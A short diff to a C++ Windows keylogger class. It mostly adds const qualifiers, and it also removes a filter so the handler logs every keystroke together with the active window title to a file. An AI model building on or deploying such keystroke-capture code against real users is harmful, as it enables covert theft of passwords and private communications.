@@ -6,18 +6,14 @@ char Keylogger::charBuffer[1024];
 void Keylogger::start() {
 	hook = new Hook();
 	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
-	hook->setHook([this](wchar_t key[]) {
+	hook->setHook([this](const wchar_t key[]) {
 		keyboardHandler(key);
 	});
 
 	logFile.open(FILENAME, std::ios::app);
 }
 
-void Keylogger::keyboardHandler(wchar_t* keyText) {
-	if (!iswalpha(*keyText)) {
-		return;
-	}
-
+void Keylogger::keyboardHandler(const wchar_t* keyText) {
 	// Get window title and write it to file
 	HWND currentWindow = GetForegroundWindow();
 	if (currentWindow != lastActiveWindow) {
@@ -49,7 +45,7 @@ void Keylogger::keyboardHandler(wchar_t* keyText) {
 	std::cout << wcharToStr(keyText) << std::flush;
 }
 
-string Keylogger::wcharToStr(wchar_t* str) {
+string Keylogger::wcharToStr(const wchar_t* str) {
 	CharToOemW(str, charBuffer);	
 	return string(charBuffer);
 }
